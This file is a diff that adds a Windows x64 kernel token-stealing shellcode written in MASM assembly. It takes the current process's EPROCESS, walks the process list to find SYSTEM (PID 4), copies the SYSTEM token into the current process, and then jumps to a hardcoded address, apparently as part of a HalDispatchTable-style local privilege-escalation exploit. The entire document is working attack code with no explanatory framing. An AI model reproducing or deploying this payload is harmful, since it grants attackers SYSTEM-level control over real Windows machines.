@@ -1,0 +1,39 @@
+_TEXT	SEGMENT
+
+TokenStealing PROC
+	get_eproc:
+	nop
+	nop
+	nop
+	nop
+	nop
+	push	rax										;save registers
+	push	rcx										;
+	push	r9										;
+	push	r8										;
+	xor     rax, rax								;Get the EPROCESS of current Process
+	mov     rax, qword ptr gs:[rax+188h]			;
+	mov     rax, qword ptr [rax+0B8h]				;
+	mov     r8, rax									;
+	parse_eproc:
+	mov     rax, qword ptr [rax+448h]				;walk the linked process list to find SYSTEM process
+	sub     rax, 448h								;
+	mov     rcx, qword ptr [rax+440h]				;
+	cmp     rcx, 4									;
+	jne     parse_eproc								;
+	steal_token:
+	mov     r9, qword ptr [rax+4B8h]				;copy SYSTEM process token to current process
+	mov     qword ptr [r8+4B8h], r9					;
+	pop		r8										;restire registers
+	pop		r9										;
+	pop		rcx										;
+	pop		rax										;we are about to overwrite this one but stack allignment is a thing
+	mov		rax, qword ptr [0b60f0200h]				;HaliQuerySystemInformation
+	jmp		rax
+	ret
+
+TokenStealing ENDP
+
+_TEXT	ENDS
+
+End
